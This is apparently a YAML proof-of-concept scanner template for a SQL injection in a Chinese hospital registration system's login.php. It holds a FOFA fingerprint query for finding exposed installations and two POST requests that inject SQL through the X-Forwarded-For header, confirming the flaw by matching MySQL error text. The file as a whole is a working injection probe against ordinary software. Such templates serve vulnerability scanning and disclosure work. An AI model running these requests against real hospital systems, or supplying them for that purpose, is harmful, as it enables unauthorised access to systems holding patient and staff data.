id: poc-yaml-hospital-registration-system-sqli
info:
  name: 医院挂号系统 login.php SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 医院挂号系统
  fofa: body="res/img/ht_box_back.gif" || body="/res/img/ht_box_top.gif" || body="/res/img/ht_box_bottom.gif"
    || body="dom_loaded.load(init);"
requests:
- method: POST
  path: /m/login.php?op=login
  headers:
    X-Forwarded-For: 127.0.0.1 '
    Content-Type: application/x-www-form-urlencoded
  data: username=admin&password=admin&vcode=4997&to=&vcode_hash=03b498138c14b2d0515b5438808d6604
  expression: "status_code == 200 && \ncontains(body,\"SQL syntax\") &&\ncontains(body,\"\
    MySQL server\")\n"
- method: POST
  path: /m/login.php?op=login
  headers:
    X-Forwarded-For: 127.0.0.1 ' and exists(select * from xxxxx)-- 123
    Content-Type: application/x-www-form-urlencoded
  data: username=admin&password=admin&vcode=4997&to=&vcode_hash=03b498138c14b2d0515b5438808d6604
  expression: "status_code == 200 && \ncontains(body,\"sys_login_error\") &&\ncontains(body,\"\
    Table\") &&\ncontains(body,\"doesn't exist\")\n"
variables: {}
transport: http
